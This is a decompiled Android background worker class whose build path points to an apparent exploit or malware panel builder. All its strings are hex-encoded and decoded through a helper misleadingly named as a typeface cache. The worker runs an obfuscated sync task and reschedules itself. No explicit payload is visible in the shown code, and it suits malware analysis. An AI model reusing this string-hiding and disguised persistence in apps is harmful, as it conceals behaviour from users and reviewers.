package app.mobilex.plus.workers;

import android.content.Context;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import app.mobilex.plus.services.SyncQYAdapter;
import app.mobilex.plus.util.TypefaceCache;
import v.s.MdvPnR06eW9Un0O;
import v.s.OFMrQsTe5s1KYV0lq;
import v.s.VSZeS5mia3yEXbAe;
import v.s.di1l5OJ60eKNOgQR8yCS;
import v.s.eyavN4VgkDpngkAKt;
import v.s.roAK4OF9CtSmlCJgpQ;
import v.s.y6jRGLEWNMir;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class DataFPAdapter extends Worker {
    public static final String b1EoSIRjJHO5;
    public static final String ibVTtJUNfrGYbW;
    public static final String xDyLpEZyrcKVe0;

    static {
        TypefaceCache.obtain("00070077004F008600D6008F00F300A300220066004F008200E2");
        xDyLpEZyrcKVe0 = TypefaceCache.obtain("0033007F0055008000CF00A800DD00B5002800730049");
        ibVTtJUNfrGYbW = TypefaceCache.obtain("0033007F0055008000CF00BC00DA00A6002A00780064009000FF00AD00D900A20031");
        b1EoSIRjJHO5 = TypefaceCache.obtain("0033007F0055008000CF00B100DD00B0001C00610054009500FB00BA00C0");
    }

    public DataFPAdapter(Context context, WorkerParameters workerParameters) {
        super(context, workerParameters);
    }

    @Override // androidx.work.Worker
    public final MdvPnR06eW9Un0O xDyLpEZyrcKVe0() {
        Context context = this.dDIMxZXP1V8HdM;
        try {
            TypefaceCache.obtain("00070077004F008600D6008F00F300A300220066004F008200E200FF00D700BF00260075004E009300F900B100D500E9006D0038");
            String str = SyncQYAdapter.ECwLkmPW1UKz7J6E;
            y6jRGLEWNMir.Qrz92kRPw4GcghAc(context, TypefaceCache.obtain("00140059006900AC00D5008D00ED008C00060053006B00A600DC009600E40082"));
            Object obj = ((roAK4OF9CtSmlCJgpQ) y6jRGLEWNMir.wotphlvK9sPbXJ(new eyavN4VgkDpngkAKt(this, null, 2))).w9sT1Swbhx3hs;
            OFMrQsTe5s1KYV0lq.l1V0lQr6TbwNKqHfXNbb(context, 5L);
            if (!(obj instanceof VSZeS5mia3yEXbAe)) {
                TypefaceCache.obtain("0013007F0055008000B000AC00C700A4002000730048009400F600AA00DE00EB00630078005E009F00E400FF00D100AF0022007F005500C700F900B1009200F20063007B00520089");
                return MdvPnR06eW9Un0O.dDIMxZXP1V8HdM();
            }
            TypefaceCache.obtain("0013007F0055008000B000B900D300AE002F0073005F00DD00B0");
            Throwable thDDIMxZXP1V8HdM = roAK4OF9CtSmlCJgpQ.dDIMxZXP1V8HdM(obj);
            if (thDDIMxZXP1V8HdM != null) {
                thDDIMxZXP1V8HdM.getMessage();
            }
            return new di1l5OJ60eKNOgQR8yCS();
        } catch (Exception e) {
            TypefaceCache.obtain("0013007F0055008000B000BA00C000B5002C0064000100C7");
            e.getMessage();
            OFMrQsTe5s1KYV0lq.l1V0lQr6TbwNKqHfXNbb(context, 5L);
            return new di1l5OJ60eKNOgQR8yCS();
        }
    }
}
